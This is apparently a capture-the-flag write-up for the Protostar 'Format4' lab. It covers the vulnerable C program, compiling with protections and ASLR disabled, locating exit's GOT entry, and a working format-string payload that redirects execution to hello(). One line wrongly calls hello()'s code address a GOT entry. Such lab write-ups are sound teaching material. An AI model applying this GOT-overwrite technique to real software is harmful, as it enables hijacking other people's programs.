## Protostar-Format4 Solution

### 1. Introduction

This is a poc solution for the "Format4" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20140811171216/http://exploit-exercises.com/protostar/format4](https://web.archive.org/web/20140811171216/http://exploit-exercises.com/protostar/format4) 
 
**Hints:**
* format4 looks at one method of redirecting execution in a process.
* *objdump -TR is your friend

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o format_4 format_4.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

Goal is to print out the following message by exploiting the format string vulnerability.

```nasm
gdb-peda$ disas hello
Dump of assembler code for function hello:
   0x080484fd <+0>:	push   ebp
   0x080484fe <+1>:	mov    ebp,esp
   0x08048500 <+3>:	sub    esp,0x18
   0x08048503 <+6>:	mov    DWORD PTR [esp],0x8048600
   0x0804850a <+13>:	call   0x80483c0 <puts@plt>
   0x0804850f <+18>:	mov    DWORD PTR [esp],0x1
   0x08048516 <+25>:	call   0x80483a0 <_exit@plt>
End of assembler dump.

gdb-peda$ x/s 0x8048600
0x8048600:	"code execution redirected! you win"
```

If we can overwrite the entry of the exit() function in the GOT (Global Offset Table) then we can manipulate program flow therefore hello() function would be called.

```
$ objdump -t ./format_4 | grep hello
080484fd g     F .text	0000001e              hello

$ objdump -TR ./format_4 | grep exit
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   exit
0804a010 R_386_JUMP_SLOT   _exit
0804a020 R_386_JUMP_SLOT   exit
```

As seen above,
exit() function has an entry in the GOT at **0804a020**.
hello() function has an entry in the GOT at **080484fd**.

#### 2.2 Quick Solution

Let's start by finding the right offset of our input parameter of printf() on the stack by stack popping to manipulate internal stack pointer.


```nasm
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x0804851b <+0>:	push   ebp
   0x0804851c <+1>:	mov    ebp,esp
   0x0804851e <+3>:	sub    esp,0x218
   0x08048524 <+9>:	mov    eax,ds:0x804a030
   0x08048529 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x0804852d <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048535 <+26>:	lea    eax,[ebp-0x208]
   0x0804853b <+32>:	mov    DWORD PTR [esp],eax
   0x0804853e <+35>:	call   0x80483b0 <fgets@plt>
   0x08048543 <+40>:	lea    eax,[ebp-0x208]
   0x08048549 <+46>:	mov    DWORD PTR [esp],eax
   0x0804854c <+49>:	call   0x8048390 <printf@plt>
   0x08048551 <+54>:	mov    DWORD PTR [esp],0x1
   0x08048558 <+61>:	call   0x80483e0 <exit@plt>
End of assembler dump.
gdb-peda$ b * 0x0804854c
Breakpoint 1 at 0x804854c: file format_4.c, line 20.
gdb-peda$ r
Starting program: format_4 
AAAA 
...Trim...
[-------------------------------------code-------------------------------------]
   0x804853e <vuln+35>:	call   0x80483b0 <fgets@plt>
   0x8048543 <vuln+40>:	lea    eax,[ebp-0x208]
   0x8048549 <vuln+46>:	mov    DWORD PTR [esp],eax
=> 0x804854c <vuln+49>:	call   0x8048390 <printf@plt>
   0x8048551 <vuln+54>:	mov    DWORD PTR [esp],0x1
...Trim...

gdb-peda$ x $esp
0xffffcef0:	0xffffcf00

gdb-peda$ p/d (0xffffcf00-0xffffcef0)/4
$1 = 4
```
As seen above, the offset is 4 bytes.

It's possible to validate by select 4th argument via **$** (direct access) as well.

```
$ ./format_4
AAAA%4$x
AAAA41414141                     
```

The following payload is created by using short writes method as explained in format-3 solution.

Target address: **0804a020**
Target value: **080484fd**

Let's split **080484fd** into **0x84fd** and **0x0804**.

0x0804 in decimal: **2052** 
0x84fd in decimal: **34045**

So we will write the following:

1. **34045** to **0804a020**
2. **2052** to **0804a022**

Payload calculation in-short: 
```
"\x22\xa0\x04\x08" + "\x20\xa0\x04\x08" + "%(2052-8)d" + "%4\$hn" + "%(34045-2052)d" + "%5\$hn"
```

It's possible to validate via gdb as shown on format-3 solution.

#### 2.3 Final PoC

```
$ python -c 'print "\x22\xa0\x04\x08\x20\xa0\x04\x08%2044d%4$hn%31993d%5$hn"' | ./format_4
"� �                                                                     ...TRIM...
512
...TRIM...
-134493152
code execution redirected! you win
```

**Note:** If first half the addreses are same then last 2 bytes would be enough to solve the challenge.
